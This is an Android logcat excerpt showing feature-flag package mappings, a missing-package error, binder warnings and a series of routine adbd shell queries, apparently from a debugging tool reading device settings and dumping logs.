06-30 03:20:38.613 20756 20756 I AconfigPackage: android.os.profiling.anomaly.flags is mapped to com.android.profiling
06-30 03:20:38.614 20756 20756 I AconfigPackage: com.android.healthfitness.flags is mapped to com.android.healthfitness
06-30 03:20:38.615 20756 20756 I AconfigPackage: com.android.art.flags is mapped to com.android.art
06-30 03:20:38.615 20756 20756 I AconfigPackage: com.android.art.rw.flags is mapped to com.android.art
06-30 03:20:38.615 20756 20756 I AconfigPackage: com.android.libcore is mapped to com.android.art
06-30 03:20:38.616 20756 20756 I AconfigPackage: android.provider.flags is mapped to com.android.configinfrastructure
06-30 03:20:38.616 20756 20756 I AconfigPackage: com.android.server.deviceconfig is mapped to com.android.configinfrastructure
06-30 03:20:38.617 20756 20756 I AconfigPackage: com.google.android.widevine.flags is mapped to com.google.android.widevine
06-30 03:20:38.617 20756 20756 I AconfigPackage: com.android.adbd.flags is mapped to com.android.adbd
06-30 03:20:38.618 20756 20756 I AconfigPackage: android.graphics.pdf.flags is mapped to com.android.mediaprovider
06-30 03:20:38.618 20756 20756 I AconfigPackage: com.android.providers.media.flags is mapped to com.android.mediaprovider
06-30 03:20:38.618 20756 20756 I AconfigPackage: android.graphics.pdf.flags.readonly is mapped to com.android.mediaprovider
06-30 03:20:38.619 20756 20756 I AconfigPackage: com.android.bluetooth.beta.flags is mapped to com.android.bt
06-30 03:20:38.619 20756 20756 I AconfigPackage: com.android.bluetooth.flags is mapped to com.android.bt
06-30 03:20:38.620 20756 20756 E FeatureFlagsImplExport: android.os.flagging.AconfigStorageReadException: ERROR_PACKAGE_NOT_FOUND: package android.xr cannot be found on the device
06-30 03:20:38.631 20756 20756 D AndroidRuntime: Shutting down VM
06-30 03:20:38.631 20756 20765 W libbinder.IPCThreadState: call to talkWithDriver in joinThreadPool returned error: -9 (Bad file descriptor), FD: -1
06-30 03:20:38.631 20756 20766 W libbinder.IPCThreadState: call to talkWithDriver in joinThreadPool returned error: -9 (Bad file descriptor), FD: -1
06-30 03:20:38.786  1719  1793 D HighBrightnessModeController: onAmbientLuxChange: 0.05125/25000.0, IsHighLux: false
06-30 03:20:39.530  1226  1226 I adbd    : adbd service requested 'shell,v2,TERM=xterm-256color,raw:pm query-activities --brief -a android.intent.action.VIEW -d file:///etc/passwd'
06-30 03:20:39.643  1226  1226 I adbd    : adbd service requested 'shell,v2,TERM=xterm-256color,raw:settings get secure bluetooth_name'
06-30 03:20:39.758  1226  1226 I adbd    : adbd service requested 'shell,v2,TERM=xterm-256color,raw:settings get global device_name'
06-30 03:20:39.857  1226  1226 I adbd    : adbd service requested 'shell,v2,TERM=xterm-256color,raw:settings get secure android_id'
06-30 03:20:39.959  1226  1226 I adbd    : adbd service requested 'shell,v2,TERM=xterm-256color:export ANDROID_LOG_TAGS=''; exec logcat '-d''
